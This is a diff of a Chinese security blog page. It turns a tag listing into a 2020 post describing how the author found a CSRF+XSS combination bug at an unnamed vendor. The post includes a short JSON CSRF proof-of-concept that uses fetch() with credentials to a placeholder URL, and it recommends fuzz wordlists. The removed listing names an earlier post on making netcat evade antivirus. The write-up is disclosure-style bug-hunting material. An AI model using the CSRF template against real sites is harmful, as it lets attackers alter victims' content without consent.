@@ -6,15 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://tenkk.xyz">
-  <title>Tag: 教程 | Tenkk小小的blog</title>
+  <title>记匿名某厂商的csrf+xss组合漏洞发现过程 | Tenkk小小的blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Tenkk小小的blog">
-<meta property="og:url" content="http://tenkk.xyz/tags/教程/index.html">
+  <meta name="description" content="挖了两天某匿名厂商的漏洞，大厂安全措施还是做的挺好的，虽然小问题挺多，但都大多都利用不上。在文章发布处进行xss fuzz(对国内网站进行渗透，我推荐这个字典：https://github.com/TheKingOfDuck/fuzzDicts，对国外网站推荐这个：https://github.com/danielmiessler/SecLists)，发现保存草稿后会弹窗，但发布之后，所有可弹窗的">
+<meta name="keywords" content="web,挖洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记匿名某厂商的csrf+xss组合漏洞发现过程">
+<meta property="og:url" content="http://tenkk.xyz/2020/03/24/某厂商csrf-xss漏洞发现过程/index.html">
 <meta property="og:site_name" content="Tenkk小小的blog">
+<meta property="og:description" content="挖了两天某匿名厂商的漏洞，大厂安全措施还是做的挺好的，虽然小问题挺多，但都大多都利用不上。在文章发布处进行xss fuzz(对国内网站进行渗透，我推荐这个字典：https://github.com/TheKingOfDuck/fuzzDicts，对国外网站推荐这个：https://github.com/danielmiessler/SecLists)，发现保存草稿后会弹窗，但发布之后，所有可弹窗的">
 <meta property="og:locale" content="cn">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/24/8LEh1f.png">
+<meta property="og:updated_time" content="2020-03-24T10:05:06.897Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Tenkk小小的blog">
+<meta name="twitter:title" content="记匿名某厂商的csrf+xss组合漏洞发现过程">
+<meta name="twitter:description" content="挖了两天某匿名厂商的漏洞，大厂安全措施还是做的挺好的，虽然小问题挺多，但都大多都利用不上。在文章发布处进行xss fuzz(对国内网站进行渗透，我推荐这个字典：https://github.com/TheKingOfDuck/fuzzDicts，对国外网站推荐这个：https://github.com/danielmiessler/SecLists)，发现保存草稿后会弹窗，但发布之后，所有可弹窗的">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/03/24/8LEh1f.png">
   
     <link rel="alternative" href="/atom.xml" title="Tenkk小小的blog" type="application/atom+xml">
   
@@ -133,69 +140,125 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-某厂商csrf-xss漏洞发现过程" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/29/使用VS2017编译netcat全部功能并免杀国内杀软/" class="archive-article-date">
-  	<time datetime="2019-11-29T13:06:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-29</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/29/使用VS2017编译netcat全部功能并免杀国内杀软/">使用VS2017编译netcat全部功能并免杀国内杀软</a>
+    <h1 class="article-title" itemprop="name">
+      记匿名某厂商的csrf+xss组合漏洞发现过程
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2020/03/24/某厂商csrf-xss漏洞发现过程/" class="archive-article-date">
+  	<time datetime="2020-03-24T09:27:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-24</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>挖了两天某匿名厂商的漏洞，大厂安全措施还是做的挺好的，虽然小问题挺多，但都大多都利用不上。<br>在文章发布处进行xss fuzz(对国内网站进行渗透，我推荐这个字典：<code>https://github.com/TheKingOfDuck/fuzzDicts</code>，对国外网站推荐这个：<code>https://github.com/danielmiessler/SecLists</code>)，发现保存草稿后会弹窗，但发布之后，所有可弹窗的标签全过滤掉了。<br>第一就反应是进行csrf+xxs组合拳，由于文章POST上去数据是json格式，推荐使用fetch，基本所有浏览器都支持：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; </span><br><span class="line">&lt;title&gt;<span class="built_in">JSON</span> CSRF POC&lt;<span class="regexp">/title&gt; </span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">fetch('https:/</span><span class="regexp">/url', &#123;method: 'POST', credentials: 'include', headers: &#123;'Content-Type': 'text/</span>plain<span class="string">'&#125;, body: '</span>payload<span class="string">'&#125;); </span></span><br><span class="line"><span class="string">&lt;/script&gt; </span></span><br><span class="line"><span class="string">&lt;/form&gt; </span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>浏览器换账号，新建一篇文章，访问此网页后进入文章修改，果然文章根据payload内容替换了，并且弹了窗。<br><img src="https://s1.ax1x.com/2020/03/24/8LEh1f.png" alt><br>由于网站发布文章需要人工审核，也没有对发布后的文章进行测试，我猜想也会被改掉。反正漏洞提交，后续验证就交给厂商了。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">教程</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">工具</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">WIN</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">挖洞</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2020/02/18/Parallels安装Kali2020-1虚拟机并安装桌面和Parallels-Tool/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Parallels安装Kali2020.1虚拟机并安装桌面和Parallels Tool</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
 
+  
+
+  
+
+
+  <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+    <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "pcr4M3Yjz6vlS0C9WzjicPuF-MdYXbMMI",
+            app_key: "N1g3hS1JsdREoVzRs8zDoQwh",
+            placeholder: "不说点什么？",
+            avatar:"hide"
+        });
+    }
+</script>
+
+  </section>
 
           </div>
         </div>
@@ -218,9 +281,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
